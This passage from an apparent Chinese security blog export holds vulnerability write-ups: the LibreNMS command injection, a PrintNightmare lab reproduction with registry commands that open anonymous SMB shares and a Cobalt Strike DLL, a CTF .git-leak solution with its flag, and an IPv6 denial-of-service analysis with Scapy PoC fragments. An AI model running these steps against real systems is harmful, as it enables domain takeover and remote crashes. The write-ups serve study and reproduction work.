<p>装好了之后根据官方配置（太简略，并不能成功（<a href="https://docs.librenms.org/Support/Configuration/#collectd">https://docs.librenms.org/Support/Configuration/#collectd</a></p>
<p>最后找到github上一个配置才成功，此时页面上出现了collectd插件</p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100410102.png" alt="image-20201112100410102"></p>
<p>也能打成功了</p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100430763.png" alt="image-20201112100430763"></p>
<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>漏洞点：html/includes/graphs/device/collectd.inc.php</p>
<p>其中用户提供的参数from和to是用mysqli_escape_real_string函数（mres）过滤的，但是这个函数不能转义多个命令行语法字符，我们就可以注入命令到变量$rrd_cmd中，通过passthru()执行</p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/DED6A2E31D73FFB660CEFBF548FD1BD6.png" alt="DED6A2E31D73FFB660CEFBF548FD1BD6"></p>
<p>passthru — 执行外部程序并且显示原始输出</p>
<p>passthru ( string $command [, int &amp;$return_var ] ) : void </p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/B99C52DBA71F8893ED2EBA7059B778F5.jpg" alt="B99C52DBA71F8893ED2EBA7059B778F5"></p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205158282.png" alt="image-20201112205158282"></p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205315869.png" alt="image-20201112205315869"></p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412.jpg" alt="3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412"></p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205357269.png" alt="image-20201112205357269"></p>
<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>librenms</tag>
      </tags>
  </entry>
  <entry>
    <title>0x10CVE-2021-1675复现</title>
    <url>/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>又是一个域漏洞</p>
<p>参考：</p>
<blockquote>
<p><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p>
<p><a href="https://mp.weixin.qq.com/s/V0acZgnqXS4NYAVdO2m3Cg">https://mp.weixin.qq.com/s/V0acZgnqXS4NYAVdO2m3Cg</a></p>
</blockquote>
<a id="more"></a>

<h4 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h4><h5 id="靶机和攻击机准备："><a href="#靶机和攻击机准备：" class="headerlink" title="靶机和攻击机准备："></a>靶机和攻击机准备：</h5><h6 id="域控主机："><a href="#域控主机：" class="headerlink" title="域控主机："></a>域控主机：</h6><p>安装了2019的windows server</p>
<p>镜像连接：<a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p>
<p>选的是Windows Server 2019 Essentials (x64) - DVD (Chinese-Simplified) </p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705183115850.png" alt="image-20210705183115850"></p>
<p>安装好后，点开服务器管理器，安装ad服务</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181948192.png" alt="image-20210705181948192"></p>
<p>就一步步正常走即可，不放心的话搜索个教程就可以了</p>
<p>安装好之后，在这里点开ad服务管理</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182030105.png" alt="image-20210705182030105"></p>
<p>新建一个普通域用户</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182056092.png" alt="image-20210705182056092"></p>
<p>设置用户名和密码后，可以看到如下：</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181909731.png" alt="image-20210705181909731"></p>
<p>域控机ip：</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181923619.png" alt="image-20210705181923619"></p>
<h6 id="共享文件机："><a href="#共享文件机：" class="headerlink" title="共享文件机："></a>共享文件机：</h6><p>一台win10的虚拟机</p>
<p>先加入域控：更改计算机名（会要求输入一个账号密码，是域控那台虚拟机的登陆的账号密码），当然网络设置要记得改一下，dns要改成域控的ip</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182213718.png" alt="image-20210705182213718"></p>
<p>使用github项目中的smb设置语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir C:\share</span><br><span class="line">icacls C:\share\ &#x2F;T &#x2F;grant Anonymous&#96; logon:r</span><br><span class="line">icacls C:\share\ &#x2F;T &#x2F;grant Everyone:r</span><br><span class="line">New-SmbShare -Path C:\share -Name share -ReadAccess &#39;ANONYMOUS LOGON&#39;,&#39;Everyone&#39;</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; &#x2F;v NullSessionPipes &#x2F;t REG_MULTI_SZ &#x2F;d srvsvc &#x2F;f #This will overwrite existing NullSessionPipes</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; &#x2F;v NullSessionShares &#x2F;t REG_MULTI_SZ &#x2F;d share &#x2F;f</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v EveryoneIncludesAnonymous &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v RestrictAnonymous &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line"># Reboot</span><br></pre></td></tr></table></figure>

<p>设置共享文件夹（我这里是因为已经设置过了所以出现红色了</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181440486.png" alt="image-20210705181440486"></p>
<p>在其中放入用攻击机生成的恶意dll，此时在域控下就可以访问到了</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182009710.png" alt="image-20210705182009710"></p>
<h6 id="攻击机："><a href="#攻击机：" class="headerlink" title="攻击机："></a>攻击机：</h6><p>使用kali2018，cs4，生成一个恶意的dll（github的项目中是自己写的一个恶意dll，准备捡起易语言重新写写恶意dll了</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181621562.png" alt="image-20210705181621562"></p>
<h5 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h5><p>使用exp，格式是普通域用户的用户名:密码@域控ip smb共享文件的路径</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181533349.png" alt="image-20210705181533349"></p>
<p>攻击完成后，在cs中就可以看到上线了</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181558463.png" alt="image-20210705181558463"></p>
<p>ps：共享机我一开始使用的是win7，结果powershell版本不够高语句跑不了</p>
<p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182346183.png" alt="image-20210705182346183"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>spoolsv.exe</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-2020.6.12</title>
    <url>/2020/06/12/CTF-2020.6.12/</url>
    <content><![CDATA[<h4 id="git文件泄露导致源码泄露"><a href="#git文件泄露导致源码泄露" class="headerlink" title=".git文件泄露导致源码泄露"></a>.git文件泄露导致源码泄露</h4><p>首先，关于git：分布式版本控制系统（版本控制：记录每次文件的改动，并支持协作编辑）</p>
<h5 id="0x1-一些用语解释："><a href="#0x1-一些用语解释：" class="headerlink" title="0x1 一些用语解释："></a>0x1 一些用语解释：</h5><a id="more"></a>

<p>集中式：全部文件存在一个中央服务器中，需联网，修改时从中央服务器中取出修改完放回去。</p>
<p>分布式：各个电脑里都有完整的版本库，修改后需推送，安全性高，可以有一个中央服务器用来方便大家交换修改的版本。</p>
<p>版本库：仓库，目录，文件的修改删除git都可跟踪</p>
<p>工作区和暂存区：工作区就是自身电脑可看到的目录，暂存区在版本库中，将工作区的文件添加到暂存区（git add），然后将暂存区的所有文件添加到master（git commit）。master也是分支，分支的作用是上传未写完的代码后不会让未写完的代码影响别人。</p>
<h5 id="0x2-泄露原理："><a href="#0x2-泄露原理：" class="headerlink" title="0x2 泄露原理："></a>0x2 泄露原理：</h5><p>源码提交到远程托管网站后，从上面把源码pull到服务器时，忘记删除git文件。利用.git文件可以恢复网站的源码，源码里可能会有数据库信息。/使用git进行版本控制，对站点自动部署，配置不当会降.git文件夹直接部署到线上环境。</p>
<p>详细解释：</p>
<p>在一个目录中初始化后，会产生一个名叫.git的隐藏文件夹（版本库）</p>
<p>当开发时采用以下流程时：</p>
<p>1.初始化仓库 , 并将仓库托管在Coding或者Github上 , 便于远程协作/备份/部署<br>2.在本地进行网站开发 , 并定时提交commit , push到远程托管网站<br>3.当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站pull到Web目录下（此时会将,git文件夹下载到服务器的web目录下）<br>4.网站正常运行</p>
<p>攻击者可以利用web目录下载Git文件夹，然后就可以利用储存的版本控制信息，完全恢复网站后台的代码和目录结构以及获取数据库信息等。</p>
<h5 id="0x3-利用："><a href="#0x3-利用：" class="headerlink" title="0x3 利用："></a>0x3 利用：</h5><p>1、githack等：同构泄露的.git文件夹下的文件，还原重建工程源代码</p>
<p>2、爬虫爬取整个git目录</p>
<h5 id="0x4-修复："><a href="#0x4-修复：" class="headerlink" title="0x4 修复："></a>0x4 修复：</h5><p>1、对.git目录的访问权限进行控制</p>
<p>2、在每次Pull后删除.git文件夹</p>
<h5 id="0x5-利用场景实践："><a href="#0x5-利用场景实践：" class="headerlink" title="0x5 利用场景实践："></a>0x5 利用场景实践：</h5><p>git_extract下载：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p>cmd命令：git_extract.py  <a href="http://xxxxx/.git/">http://xxxxx/.git/</a></p>
<p>可扫描出.git漏洞</p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612152136482.png"></p>
<p>点击后：</p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105110264.png"></p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105221000.png"></p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105306274.png"></p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612154814555.png"></p>
<p>放到beyond compare（<a href="http://www.scootersoftware.com/download.php%EF%BC%89%E9%87%8C%E5%AF%B9%E6%AF%94">http://www.scootersoftware.com/download.php）里对比</a></p>
<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105349980.png"></p>
<p>仔细看差别：</p>
<p>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</p>
<p>提交即可</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-24086 Windows TCP/IP 拒绝服务漏洞复现分析</title>
    <url>/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="CVE-2021-24086-复现"><a href="#CVE-2021-24086-复现" class="headerlink" title="CVE-2021-24086 复现"></a>CVE-2021-24086 复现</h4><p>参考：</p>
<blockquote>
<p><a href="https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html">https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html</a></p>
<p><a href="https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/#the-mechanics-of-parsing-an-ipv6-packet">https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/#the-mechanics-of-parsing-an-ipv6-packet</a></p>
</blockquote>
<a id="more"></a>

<h4 id="0x1-复现过程："><a href="#0x1-复现过程：" class="headerlink" title="0x1 复现过程："></a>0x1 复现过程：</h4><h5 id="0x01-靶机环境"><a href="#0x01-靶机环境" class="headerlink" title="0x01 靶机环境"></a>0x01 靶机环境</h5><p>一个win7虚拟机，查看IPV6地址后记录</p>
<h5 id="0x02-攻击机运行poc"><a href="#0x02-攻击机运行poc" class="headerlink" title="0x02 攻击机运行poc"></a>0x02 攻击机运行poc</h5><p>同局域网下的一个kali虚拟机，运行poc，进行发包</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210817103826864.png" alt="image-20210817103826864"></p>
<h5 id="0x03-攻击成功，靶机蓝屏重启"><a href="#0x03-攻击成功，靶机蓝屏重启" class="headerlink" title="0x03 攻击成功，靶机蓝屏重启"></a>0x03 攻击成功，靶机蓝屏重启</h5><p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818162353841.png" alt="image-20210818162353841"></p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210817103818174.png" alt="image-20210817103818174"></p>
<h4 id="0x2-漏洞部分分析："><a href="#0x2-漏洞部分分析：" class="headerlink" title="0x2 漏洞部分分析："></a>0x2 漏洞部分分析：</h4><h5 id="0x20-前置知识"><a href="#0x20-前置知识" class="headerlink" title="0x20 前置知识"></a>0x20 前置知识</h5><h6 id="0x201-驱动程序tcpip-sys"><a href="#0x201-驱动程序tcpip-sys" class="headerlink" title="0x201 驱动程序tcpip.sys"></a>0x201 驱动程序tcpip.sys</h6><p>Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，以及解释此数据并将其传递给更高级别的组件。</p>
<h6 id="0x202-ipv6分片"><a href="#0x202-ipv6分片" class="headerlink" title="0x202 ipv6分片"></a>0x202 ipv6分片</h6><blockquote>
<p><a href="https://datatracker.ietf.org/doc/html/rfc8200#section-4.5">https://datatracker.ietf.org/doc/html/rfc8200#section-4.5</a></p>
</blockquote>
<p><strong>分片</strong></p>
<p>为了发送一个太大而无法放入MTU（最大传输单元）的数据包到目的地的路径，源节点将数据包分成片段，并将每个片段作为单独的数据包发送，在接收处重新组装。</p>
<p><strong>分片过程</strong></p>
<p>Fragment 标头</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818135823005.png" alt="image-20210818135823005"></p>
<p>其中每个字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Next Header-下一个         8-bit</span><br><span class="line">Reserved-保留字段            8-bit</span><br><span class="line">Fragment Offset-片段偏移量     13-bit：标头后面的数据是在重组数据包中的哪个位置（偏移量）</span><br><span class="line">Res                 2-bit</span><br><span class="line">M flag              1 &#x3D; more fragments; 0 &#x3D; last fragment</span><br><span class="line">Identification      32 bits</span><br></pre></td></tr></table></figure>

<p>原始数据包中的Per-Fragment Headers是不分片部分，其中含有IPv6 标头、Hop-by-Hop Options标头</p>
<p>剩下的部分是一个Extension &amp; Upper-Layer Headers和分出来的多个fragment数据</p>
<p>然后每个fragment数据和Per-Fragment Headers以及一个fragment header组合成一个新的数据包进行发送</p>
<p>即每个分片数据包由不可分片部分（Per-Fragment Headers）、分片报头（fragment header）和可分片部分的切片（fragment数据）组成</p>
<p>分片流程如下：</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818140303683.png" alt="image-20210818140303683"></p>
<p>重组过程则是将第一个数据包的不分片部分与所有重组的可分片部分拼接成一个重组包，流程如下：</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818180411748.png" alt="image-20210818180411748"></p>
<h5 id="0x21-漏洞原理"><a href="#0x21-漏洞原理" class="headerlink" title="0x21 漏洞原理"></a>0x21 漏洞原理</h5><p>（不知为何蓝屏导出来的dmp文件在windbg中没法看到调用链，所以就引用大佬的图了</p>
<p>漏洞的根本原因是Ipv6pReassembleDatagram 中产生的空指针引用</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818165203285.png" alt="image-20210818165203285"></p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818165357425.png" alt="image-20210818165357425"></p>
<p>可以看到是tcpip!Ipv6ReassembleDatagram中的NdisGetDataBuffer返回了一个NULL指针导致的崩溃</p>
<p>使用IDA64反编译驱动程序tcpip.sys（win7）</p>
<p>找到tcpip!Ipv6ReassembleDatagram函数（负责重新组装接收到的分片数据包的功能）</p>
<p>使用NdisGetDataBuffer函数，返回了一个连续数据开头的指针Dsta，然后使用memmove进行缓冲区转移，当引用的Dsta指针是NULL的时候，也就是空指针引用，就会引起崩溃</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818165538248.png" alt="image-20210818165538248"></p>
<h5 id="0x22-poc原理"><a href="#0x22-poc原理" class="headerlink" title="0x22 poc原理"></a>0x22 poc原理</h5><h6 id="0x221-如何让Dsta指针返回NULL"><a href="#0x221-如何让Dsta指针返回NULL" class="headerlink" title="0x221 如何让Dsta指针返回NULL"></a>0x221 如何让Dsta指针返回NULL</h6><blockquote>
<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nblapi/nf-nblapi-ndisgetdatabuffer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nblapi/nf-nblapi-ndisgetdatabuffer</a></p>
<p>函数定义：NDIS_EXPORTED_ROUTINE PVOID NdisGetDataBuffer(  </p>
<p>NET_BUFFER *NetBuffer,  </p>
<p>ULONG      BytesNeeded,  </p>
<p>PVOID      Storage,  </p>
<p>ULONG      AlignMultiple,  </p>
<p>ULONG      AlignOffset );</p>
<p><strong>NdisGetDataBuffer</strong>返回指向连续数据开头的指针或返回<strong>NULL</strong>。</p>
<p>如果<em>NetBuffer</em> 参数指向的<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer_data">NET_BUFFER</a>结构中 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer">NET_BUFFER_DATA</a>结构的<strong>DataLength</strong>成员小于 <em>BytesNeeded</em>参数中的值，则返回值为<strong>NULL</strong>。</p>
<p>如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。如果数据不连续，NDIS 使用 <em>Storage</em>参数如下：</p>
<ul>
<li>如果 <em>Storage</em>参数为非<strong>NULL</strong>，则 NDIS 将数据复制到<em>Storage</em>处的缓冲区 。返回值是传递给<em>Storage</em>参数的指针 。</li>
<li>如果 <em>Storage</em>参数为<strong>NULL</strong>，则返回值为<strong>NULL</strong>。</li>
</ul>
</blockquote>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer</a></p>
<p>DataLength：MDL 链中使用的数据空间的长度（以字节为单位）。最大长度为 0xFFFFFFFF 字节。</p>
</blockquote>
<p>根据上面两个函数规定，满足Net Buffer Data中DataLength成员小于BytesNeeded参数中的值的条件，就会返回NULL指针</p>
<p><strong>注意：</strong>继续分析Ipv6ReassembleDatagram函数，图中的NdisRetreatNetBufferDataStart函数中的Dst参数被uint16_t截断了</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818172828058.png" alt="image-20210818172828058"></p>
<p>根据图中代码，可以理解为Dst参数就是不分片部分的长度+ipv6头的长度</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818180211148.png" alt="image-20210818180211148"></p>
<p>其中a2是Ipv6pReceiveFragment中的v21=v18=Ipv6pFragmentLookup的返回值=v11=i，可以理解为需要重组的数据包的集合</p>
<p>Ipv6pReceiveFragment：</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818175059255.png" alt="image-20210818175059255"></p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818175023952.png" alt="image-20210818175023952"></p>
<p>Ipv6pFragmentLookup</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210818175125251.png" alt="image-20210818175125251"></p>
<blockquote>
<p><a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/ddi/nblapi/nf-nblapi-ndisretreatnetbufferdatastart">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/ddi/nblapi/nf-nblapi-ndisretreatnetbufferdatastart</a></p>
<p>NdisRetreatNetBufferDataStart函数:Call the <strong>NdisRetreatNetBufferDataStart</strong> function to access more <em>used data space</em> in the MDL chain of a <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer">NET_BUFFER</a> structure.</p>
</blockquote>
<p>那么比如Dst为0x11111，通过NdisRetreatNetBufferDataStart函数（可以理解为功能是获取一个MDL 链中可以使用的数据空间）截断后，MDL 链中使用的数据空间的长度就是0x1111（可以理解为一个0x1111的缓冲区），但是NdisGetDataBuffer函数使用了Dst也就是0x11111大小的数据来进行缓冲区转移，那么就会成功达到NetBuffer-&gt;DataLength &lt; BytesNeeded 的值的条件，因此返回NULL指针。</p>
<h6 id="0x222-如何发送一个巨大的包"><a href="#0x222-如何发送一个巨大的包" class="headerlink" title="0x222 如何发送一个巨大的包"></a>0x222 如何发送一个巨大的包</h6><p>对具有非常大标头的数据包进行分段并使堆栈重新组装已经重新组装的数据包</p>
<p>先创建一个需要重组的数据包，在最后一个包中，设置m=1，即需要分片，并且标识值和第二个数据包相同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IPv6ExtHdrFragment(</span><br><span class="line">            id &#x3D; second_pkt_id, m &#x3D; 1,</span><br><span class="line">            nh &#x3D; 17, offset &#x3D; 0</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210819091132061.png" alt="image-20210819091132061"></p>
<p>设置第二个数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reassembled_pkt_2 &#x3D; Ether() \</span><br><span class="line">        &#x2F; IPv6(dst &#x3D; args.target) \</span><br><span class="line">        &#x2F; IPv6ExtHdrFragment(id &#x3D; second_pkt_id, m &#x3D; 0, offset &#x3D; 1, nh &#x3D; 17) \</span><br><span class="line">        &#x2F; &#39;doar-e ftw&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210819091341303.png" alt="image-20210819091341303"></p>
<p>接收到第一个数据包后，系统开始重组，解析到最后一个分片时，Ipv6ReassembleDatagram函数运行到这里，这里的v30就是分片标识符m，如果还需要继续分片，就会运行到else中的IppReceiveHeaderBatch函数</p>
<p><img src="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210819092445786.png" alt="image-20210819092445786"></p>
<p>在IppReceiveHeaderBatch函数中，系统会再次调用tcpip!Ipv6pReceiveFragmentList函数，并且认为之前的数据包长度是第二个数据包的已经处理过的数据长度，并设置为不分片的数据长度，最终加上ipv6头，导致不分片的数据长度也就是Dst参数超过0xffff，引起崩溃</p>
]]></content>
      <categories>
        <category>二进制漏洞</category>
      </categories>
      <tags>
        <tag>tcpip.sys</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件格式总结</title>
    <url>/2021/11/18/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h4 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h4><h5 id="0x1-PE"><a href="#0x1-PE" class="headerlink" title="0x1 PE"></a>0x1 PE</h5><p>PE是Windows下使用的可执行文件格式，包括exe，dll等</p>
<p>总结性的PE文件格式思维图：</p>
<a id="more"></a>

<p><img src="/2021/11/18/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93/image-20211118153224646.png" alt="image-20211118153224646"></p>
<h5 id="0x2-PE格式"><a href="#0x2-PE格式" class="headerlink" title="0x2 PE格式"></a>0x2 PE格式</h5><p>PE头：存储运行所需要的信息（内存加载，运行起始位置等）由DOS头+三个节区头组成，PE头和各节区的尾部有一个NULL填充</p>
<p><strong>DOS头</strong>：IMAGE_DOS_HEADER结构体：40字节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAE_DOS_HEADER &#123;		</span><br><span class="line">	WORD e_magic;						  &#x2F;&#x2F;Magic number 0x00，”MZ“</span><br><span class="line">	WORD e_cblp;              &#x2F;&#x2F;Bytes on last page of file 0x02</span><br><span class="line">	WORD e_cp;                &#x2F;&#x2F;Pages in file	 0x04</span><br><span class="line">	WORD e_crlc;              &#x2F;&#x2F;Relocations   0x06</span><br><span class="line">	WORD e_cparhdr;						&#x2F;&#x2F;Size of header in paragraphs 0x08</span><br><span class="line">	WORD e_minalloc;          &#x2F;&#x2F;Minimum extra paragraphs needed 0x0A</span><br><span class="line">	WORD e_maxalloc;					&#x2F;&#x2F;Maximum extra paragraphs needed 0x0C</span><br><span class="line">	WORD e_ss;                &#x2F;&#x2F;Initial (relative) SS value	0x0E</span><br><span class="line">	WORD e_sp;							  &#x2F;&#x2F;Initial SP value 0x10</span><br><span class="line">	WORD e_csum;						  &#x2F;&#x2F;Checksum 0x12</span><br><span class="line">	WORD e_ip;							  &#x2F;&#x2F;Initial IP value 0x14</span><br><span class="line">	WORD e_cs;							  &#x2F;&#x2F;Initial (relative) CS value 0x16</span><br><span class="line">	WORD e_lfarlc;						&#x2F;&#x2F;File address of relocation table 0x18</span><br><span class="line">	WORD e_ovno;						  &#x2F;&#x2F;Overlay number 0x1A</span><br><span class="line">	WORD e_res[4];						&#x2F;&#x2F;Reserved words 0x1C</span><br><span class="line">	WORD e_oemid;						  &#x2F;&#x2F;OEM identifier 